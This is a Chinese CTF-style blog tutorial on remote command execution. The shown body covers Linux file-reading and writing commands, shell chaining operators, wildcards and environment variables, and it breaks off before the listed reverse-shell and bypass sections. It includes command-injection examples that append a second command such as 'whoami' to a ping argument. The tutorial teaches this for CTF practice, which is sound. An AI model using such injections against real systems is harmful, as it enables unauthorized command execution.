
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>RCE总结 Re:Master | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">RCE(命令执行)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">Linux系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">基础命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">常规读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E8%AF%BB%E5%8F%96%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">报错读取法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">2.1.4.</span> <span class="toc-text">文件写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%A4%9A%E6%9D%A1%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.5.</span> <span class="toc-text">执行多条命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">命令注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">Linux通配符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.3.</span> <span class="toc-text">系统环境变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%93%E5%90%88%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9B%B2%E5%8C%B9%E9%85%8D"><span class="toc-number">2.4.1.</span> <span class="toc-text">环境变量结合通配符盲匹配</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.5.</span> <span class="toc-text">Linux无回显命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dnslog%E5%B8%A6%E5%A4%96"><span class="toc-number">2.5.1.</span> <span class="toc-text">dnslog带外</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%B9%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.5.2.</span> <span class="toc-text">写入文件并下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%96%87%E4%BB%B6%E6%83%85%E5%86%B5"><span class="toc-number">2.5.3.</span> <span class="toc-text">大文件情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.5.4.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E9%A9%AC"><span class="toc-number">2.5.5.</span> <span class="toc-text">写马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.5.6.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.6.</span> <span class="toc-text">Bash无字母数字命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E9%99%90%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.7.</span> <span class="toc-text">极限长度命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E5%AD%97%E7%AC%A6"><span class="toc-number">2.7.1.</span> <span class="toc-text">7字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E5%AD%97%E7%AC%A6"><span class="toc-number">2.7.2.</span> <span class="toc-text">5字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%AD%97%E7%AC%A6"><span class="toc-number">2.7.3.</span> <span class="toc-text">4字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">2.8.</span> <span class="toc-text">Bash环境变量注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">PHP危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-number">3.1.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo"><span class="toc-number">3.2.</span> <span class="toc-text">phpinfo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-number">3.3.</span> <span class="toc-text">call_user_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#create-function"><span class="toc-number">3.4.</span> <span class="toc-text">create_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#assert"><span class="toc-number">3.5.</span> <span class="toc-text">assert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.</span> <span class="toc-text">可执行系统命令的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">3.7.</span> <span class="toc-text">php函数层面绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">3.8.</span> <span class="toc-text">PHP无字母数字rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D-PHP-gt-7"><span class="toc-number">3.8.1.</span> <span class="toc-text">取反(PHP&gt;7)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">3.8.2.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">3.8.3.</span> <span class="toc-text">自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">3.8.4.</span> <span class="toc-text">临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%97%A0%E5%8F%82rce"><span class="toc-number">3.9.</span> <span class="toc-text">PHP无参rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.9.1.</span> <span class="toc-text">php函数直接读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8session-start-session-id-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.9.2.</span> <span class="toc-text">使用session_start()+session_id()读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87dirname-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.9.3.</span> <span class="toc-text">通过dirname()实现任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8getallheaders-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.9.4.</span> <span class="toc-text">使用getallheaders()函数进行命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8get-defined-vars"><span class="toc-number">3.9.5.</span> <span class="toc-text">使用get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4-disable-functions-%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.10.</span> <span class="toc-text">突破 disable_functions 禁用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0"><span class="toc-number">3.10.1.</span> <span class="toc-text">输出打印</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95"><span class="toc-number">3.10.2.</span> <span class="toc-text">查看目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.10.3.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-Bypass"><span class="toc-number">3.10.4.</span> <span class="toc-text">RCE Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">3.10.4.1.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">3.10.4.2.</span> <span class="toc-text">pcntl_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GC-UAF"><span class="toc-number">3.10.4.3.</span> <span class="toc-text">GC UAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FFI"><span class="toc-number">3.10.4.4.</span> <span class="toc-text">FFI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ImageMagick"><span class="toc-number">3.10.4.5.</span> <span class="toc-text">ImageMagick</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cnext-CVE-2024-2961"><span class="toc-number">3.10.4.6.</span> <span class="toc-text">cnext (CVE-2024-2961)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#curl-%E2%80%93engine-RCE"><span class="toc-number">3.10.4.7.</span> <span class="toc-text">curl –engine RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E5%85%B3%E9%97%AD"><span class="toc-number">3.11.</span> <span class="toc-text">缓冲区关闭</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>RCE总结 Re:Master</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/15
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/RCE/" style="color: #03a9f4">RCE</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">8.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">39分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="RCE-命令执行"><a href="#RCE-命令执行" class="headerlink" title="RCE(命令执行)"></a>RCE(命令执行)</h1><p>此部分包含：</p>
<ul>
<li><p>基于linux命令的构造</p>
</li>
<li><p>php系统函数rce</p>
</li>
</ul>
<p>推荐食用：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/RCE-labs">https://github.com/ProbiusOfficial/RCE-labs</a></p>
<span id="more"></span>

<hr>
<h1 id="Linux系统命令"><a href="#Linux系统命令" class="headerlink" title="Linux系统命令"></a>Linux系统命令</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>快速入门：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-command-manual.html">菜鸟教程</a></p>
<h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><ul>
<li>ls</li>
<li>dir</li>
<li>echo *</li>
<li>find .</li>
<li>tree（需要额外安装）</li>
</ul>
<h3 id="常规读取文件"><a href="#常规读取文件" class="headerlink" title="常规读取文件"></a>常规读取文件</h3><ul>
<li>cat</li>
<li>tac</li>
<li>less</li>
<li>more</li>
<li>head</li>
<li>tail</li>
<li>nl</li>
<li>uniq：检查及删除文本文件(txt)中重复出现的行列，一般与 sort 命令结合使用</li>
<li>php</li>
<li>base64 -i：base64编码</li>
<li>xxd -p：十六进制编码</li>
<li>od：支持ascii，字符形式，八进制，十进制，十六进制输出</li>
<li>grep “”</li>
<li>sed “$p”</li>
</ul>
<h3 id="报错读取法"><a href="#报错读取法" class="headerlink" title="报错读取法"></a>报错读取法</h3><p>部分命令会尝试执行文件内的语句，不符合语法则会直接抛出带有文件语句的报错</p>
<ul>
<li>python&#x2F;python3</li>
<li>node（如果有）</li>
<li>sh 或 . 或内联执行 ``</li>
</ul>
<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">></span> <span class="token number">1</span>.txt
<span class="token comment"># echo/printf 重定向符写入，> 是全部重写，>> 是追加写入</span>

<span class="token builtin class-name">command</span> <span class="token operator">|</span> <span class="token function">tee</span> file.txt
<span class="token comment"># tee:读取标准输入的数据，并将其内容输出成文件</span>

<span class="token function">vim</span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>sed命令：<a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/sed.html">https://wangchujiang.com/linux-command/c/sed.html</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-e</span> 4a<span class="token punctuation">\</span>newLine testfile 
<span class="token comment"># 第四行后添加一行</span>

<span class="token function">sed</span> <span class="token string">'2,5d'</span>
<span class="token comment"># 删除第2，5行</span>

<span class="token function">sed</span> <span class="token string">'3,$d'</span>
<span class="token comment"># 删除第3到最后一行</span>

<span class="token function">sed</span> <span class="token string">'2i drink tea'</span>
<span class="token comment"># 第二行前添加一行</span>

<span class="token function">sed</span> <span class="token string">'2,5c No 2-5 number'</span>
<span class="token comment"># 替换第2到5行为 No 2-5 number</span>

<span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'5,7p'</span>
<span class="token comment"># 仅列出5到7行</span>

<span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'/oo/p'</span>
<span class="token comment"># 列出包含 oo 的行</span>

<span class="token function">sed</span> <span class="token string">'s/要被取代的字串/新的字串/g'</span>
<span class="token comment"># 数据查找与替换，g表示全局查找替换，否则默认匹配第一个，-i选项正式进行修改</span>

<span class="token builtin class-name">echo</span> hello <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/hello/(&amp;)/'</span>
<span class="token comment"># &amp;表示已匹配字符串标记，这里的 &amp; 代表 hello，最终输出(hello)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="执行多条命令"><a href="#执行多条命令" class="headerlink" title="执行多条命令"></a>执行多条命令</h3><ul>
<li><code>&amp;&amp;</code>：逻辑与运算符，只有当第一个命令执行成功，才会执行第二个命令</li>
<li><code>||</code>：逻辑或运算符，只有当第一个命令执行失败，才会执行第二个命令</li>
<li><code>;</code>：命令分隔符，堆叠命令，命令依次执行</li>
<li><code>&amp;</code>：将第一个命令放到后台执行，Shell 立即执行第二个命令</li>
</ul>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>对于以下要执行的命令，其中 $ip 是我们可控的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用这几个执行多条命令的符号，可以实现注入我们自己的命令，如：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">127.0</span>.0.1<span class="token operator">&amp;&amp;</span><span class="token function">whoami</span>
<span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token operator">||</span><span class="token function">whoami</span>
<span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token function">whoami</span>
<span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token operator">&amp;</span><span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注：在 web 请求中，<code>&amp;</code>通常需要进行url编码</p>
<hr>
<h2 id="Linux通配符"><a href="#Linux通配符" class="headerlink" title="Linux通配符"></a>Linux通配符</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">https://www.jianshu.com/p/d9633bb74e9a</a></p>
<p>用的比较多的还是前两个</p>
<p><code>*</code>：匹配零个或者多个字符</p>
<p><code>?</code>：匹配一个字符</p>
<p><code>[]</code>：匹配指定集合中的任意单个字符，比如<code>[abc]</code>表示匹配单个字符a或者b或者c</p>
<p><code>&#123;a,b&#125;</code>：匹配a或者b，a与b也是通配符，可以由其他通配符组成</p>
<p><code>!</code>：表示非，比如<code>!1.txt</code>表示排除文件<code>1.txt</code></p>
<p><code>[0-9]</code>：匹配单个数字</p>
<p><code>[[:upper:]]</code>：匹配任意单个大写字母</p>
<p><code>[[:lower:]]</code>：匹配任意单个小写字母</p>
<p><code>[[:digit:]]</code>：匹配任意单个数字，等价于<code>[0-9]</code></p>
<p><code>[[:alpha:]]</code>：匹配任意单个字母，包括大写字母与小写字母</p>
<p><code>[[:alnum:]]</code>：匹配任意单个字母与数字</p>
<p><code>[[:space:]]</code>：匹配单个空白字符</p>
<p><code>[[:punctl:]]</code>：匹配单个标点符号</p>
<p><code>[^]</code>:匹配指定集合之外的其他任意单个字符，比如<code>[^abc]</code>表示匹配除了a、b、c以外的其他任意字符</p>
<hr>
<h2 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h2><p>查看系统环境变量：env</p>
<p>查看本地定义的环境变量：set</p>
<p>linux通常固有的环境变量：</p>
<ul>
<li><p>$PATH：&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</p>
</li>
<li><p>$PWD：LAMP 的 web 服务一般起在 &#x2F;var&#x2F;www&#x2F;html</p>
</li>
<li><p>$USER：LAMP 一般是低权限的 www-data</p>
</li>
<li><p>$HOME：当前用户的主目录</p>
</li>
<li><p>~：当前用户的主目录</p>
</li>
<li><p>$SHLVL：记录多个 shell 进程实例嵌套深度的累加器（即计算套了几层shell），默认为 1</p>
</li>
<li><p>$$：shell本身的进程ID</p>
</li>
<li><p>$!：shell最后运行的后台进程PID</p>
</li>
<li><p>$?：最后运行的命令的结束代码（返回值）</p>
</li>
<li><p>$-：使用<code>set</code>命令设定的标志一览，bash 预设是 himBH</p>
</li>
<li><p>$#：添加到shell的参数个数</p>
</li>
<li><p>$0：shell本身的文件名</p>
</li>
<li><p>$1～$n：添加到Shell的各参数值。$1是第1个参数、$2是第2个参数</p>
</li>
<li><p>$_：上一次执行的命令</p>
</li>
<li><p>$IFS：内部字段分隔符，默认情况下 bash shell 会将空格、制表符、换行符当做字段分隔符</p>
</li>
<li><p>$9：当前系统shell进程的第九个参数的持有者，它始终为空字符串，但是对其进行编码会发现实际输出回车符号（%0A）</p>
<ul>
<li>${}：用于变量替换，可以精确界定变量名称的范围，以上的特殊变量均可以用大括号界定以免解析出现问题，即<code>$&#123;	#&#125;</code>、<code>$&#123;?&#125;</code>等等</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">A</span><span class="token operator">=</span>B
<span class="token builtin class-name">echo</span> <span class="token variable">$AB</span>	<span class="token comment"># 我们的目标是字符串拼接打印BB，这里反而取的是变量AB</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$&#123;A&#125;</span>B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>同样可以通过 $A$9 来实现界定范围，这里的 $9 起一个<strong>空字符串</strong>的作用</p>
</li>
</ul>
